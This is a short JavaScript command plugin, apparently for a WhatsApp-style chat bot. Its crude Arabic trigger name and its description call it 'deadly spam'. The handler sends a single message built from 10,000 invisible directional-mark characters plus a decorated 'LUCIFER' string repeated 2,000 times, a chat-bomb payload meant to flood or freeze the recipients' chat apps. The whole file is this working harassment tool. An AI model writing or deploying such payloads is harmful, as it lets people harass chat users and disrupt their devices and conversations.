const { cmd } = require('../command');

cmd({
  pattern: "نيك-شات",
  desc: "☠️ اسبام مميت 🔥",
  category: "tools",
  filename: __filename
}, async (conn, m, { reply }) => {
  const text = "\u200E".repeat(10000) + "\n" + "⎝⎝⛥ 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 ⛥⎠⎠ ".repeat(2000);
  await conn.sendMessage(m.chat, { text }, { quoted: m });
});